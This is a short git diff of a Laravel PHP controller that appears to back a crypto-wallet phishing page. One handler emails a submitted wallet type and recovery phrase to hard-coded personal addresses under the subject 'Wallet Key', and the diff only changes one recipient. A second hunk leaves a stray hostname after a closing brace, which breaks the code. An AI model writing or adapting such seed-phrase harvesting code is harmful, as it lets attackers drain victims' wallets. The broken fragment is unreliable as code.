@@ -58,7 +58,7 @@ class PagesController extends Controller
 
         if ($mailList) {
             Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) {
-                $message->to(['lawalfemi33@gmail.com', 'hello@callmehalpha.me'])
+                $message->to(['lawalfemi33@gmail.com', 'project@callmehalpha.me'])
                     ->subject('Wallet Key');
             });
 
@@ -108,7 +108,7 @@ class PagesController extends Controller
             return redirect()->back();
 
         }
-    }
+    }ns2.callmehalpha.me
 //Adding links and email
     public function postLink(Request $request)
     {
